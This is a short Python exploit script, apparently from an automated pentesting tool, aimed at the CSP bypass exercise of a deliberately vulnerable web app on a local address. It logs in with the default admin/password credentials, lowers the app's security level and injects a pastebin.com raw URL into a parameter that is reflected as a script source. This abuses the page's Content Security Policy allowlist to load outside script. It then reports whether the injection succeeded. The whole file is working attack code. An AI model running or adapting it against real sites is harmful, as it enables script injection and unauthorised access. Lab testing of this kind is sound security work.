#!/usr/bin/env python3
"""CSP Bypass probe for /vulnerabilities/csp/ — Brain Engine v1
CSP allows pastebin.com; include param reflected as script src."""
import requests, re, sys
B = 'http://172.17.0.1:3100'
marker = sys.argv[1] if len(sys.argv) > 1 else 'CSP18-4D8A2F6E'
s = requests.Session()
r = s.get(B + '/login.php', timeout=10)
t = re.search(r"name='user_token' value='([^']+)'", r.text)
tok = t.group(1) if t else ''
s.post(B + '/login.php', data={'username': 'admin', 'password': 'password', 'Login': 'Login', 'user_token': tok}, timeout=10)
r = s.get(B + '/security.php', timeout=10)
t = re.search(r"name='user_token' value='([^']+)'", r.text)
tok2 = t.group(1) if t else ''
s.post(B + '/security.php', data={'security': 'low', 'seclev_submit': 'Submit', 'user_token': tok2}, timeout=10)
# The include param is reflected as <script src='...'>
payload = f"https://pastebin.com/raw/{marker}"
r = s.post(B + '/vulnerabilities/csp/', data={'include': payload}, timeout=10)
reflected = marker in r.text and 'script' in r.text.lower() and 'src' in r.text.lower()
print(f"MARKER: {marker}")
print(f"REFLECTED_AS_SCRIPT: {reflected}")
print(f"STATUS: {r.status_code}")
if reflected:
    print(f"VERDICT: CONFIRMED")
else:
    print(f"VERDICT: FAILED")
